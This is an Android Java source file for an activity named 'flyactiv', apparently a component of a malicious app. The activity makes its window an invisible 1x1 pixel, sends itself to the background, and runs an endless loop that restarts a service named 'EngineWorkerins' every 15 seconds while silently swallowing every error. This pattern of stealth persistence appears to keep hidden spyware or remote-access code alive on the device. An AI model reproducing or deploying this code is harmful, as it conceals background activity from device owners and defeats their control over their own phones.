package store.apps;

import android.app.Activity;

import android.content.Intent;

import android.os.Build;
import android.os.Bundle;

import android.view.WindowManager;


public class flyactiv extends Activity {



    @Override
    public void onAttachedToWindow() {
        super.onAttachedToWindow();

        this.getWindow().setLayout(1, 1);
    }

    public void setWindowParams() {
        WindowManager.LayoutParams wlp = getWindow().getAttributes();
        wlp.dimAmount = 0;
        wlp.flags = WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
        getWindow().setAttributes(wlp);
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        try
        {


            setWindowParams();
            this.getWindow().setLayout(1, 1);
        }catch (Exception e){}



        Runnable runnable = new Runnable(){
            public void run() {
                int num = 15000;
                try
                {
                    do {
                        try {
                            Thread.sleep(num);
                        } catch (InterruptedException e) {

                        }

                        try
                        {
                            sendBroadcast(new Intent(getApplicationContext(), MyReceiver.class).setAction("MyAction"));
                            if (RTPluginsHelper._mthd_issrvrun_(EngineWorkerins.class, getApplicationContext(),"[RANDOM-STRING]")) {
                                Intent i = new Intent(getApplicationContext(), EngineWorkerins.class);
                                DataScan1.sr(getApplicationContext(),i);

                            }
                        }catch (Exception e){

                        }


                    }while (true);

                }catch (Exception Ex){}
            }
        };

        Thread thread = new Thread(runnable);

        thread.start();

      this.moveTaskToBack(true);
    }


    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }

    @Override
    public void finish() {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            super.finishAndRemoveTask();
        }
        else {
            super.finish();
        }
    }


}
